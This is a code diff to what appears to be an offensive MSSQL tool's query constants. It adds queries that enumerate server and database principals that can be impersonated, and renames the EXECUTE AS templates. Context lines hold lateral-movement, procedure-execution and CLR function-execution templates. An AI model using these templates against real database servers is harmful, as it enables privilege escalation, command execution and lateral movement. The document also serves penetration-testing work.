@@ -1,7 +1,8 @@
 # Impersonation and authentication queries
-CAN_IMPERSONATE_AS = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
-IMPERSONATE_AS_USER = "EXECUTE AS LOGIN = '{username}';"
-AUTHENTICATE_AS_USER = "EXECUTE AS USER = '{username}';"
+CAN_IMPERSONATE_AS_SERVER_PRINCIPAL = "SELECT distinct b.name as username FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' AND a.state_desc = 'GRANT';"
+CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL = "SELECT distinct b.name as username FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' AND a.state_desc = 'GRANT';"
+IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}';"
+IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}';"
 
 # Lateral movement queries
 LINKABLE_SERVERS = "EXEC sp_linkedservers;"
@@ -13,6 +14,7 @@ PROCEDURE_EXECUTION = "DECLARE @x AS VARCHAR(100)='{procedure}'; EXEC @x '{comma
 # General queries
 USER_CONTEXT = "SELECT USER_NAME() as username;"
 SERVER_HOSTNAME = "SELECT @@SERVERNAME AS [ServerName];"
+
 
 # Permission checks
 IS_UPDATE_SP_CONFIGURE_ALLOWED = "SELECT IIF(IS_SRVROLEMEMBER('sysadmin', SYSTEM_USER) = 1 OR HAS_PERMS_BY_NAME('sp_configure', 'OBJECT', 'ALTER', SYSTEM_USER) = 1, 'True', 'False') AS [CanChangeConfiguration];"
@@ -34,3 +36,6 @@ DROP_ASSEMBLY = "DROP ASSEMBLY {asm_name};"
 DROP_FUNCTION = "DROP FUNCTION {function_name};"
 FUNCTION_EXECUTION = "SELECT dbo.{function_name}({command});"
 LDAP_QUERY = "SELECT * FROM 'LDAP://localhost:{port}'"
+
+
+# SELECT name, type_desc FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
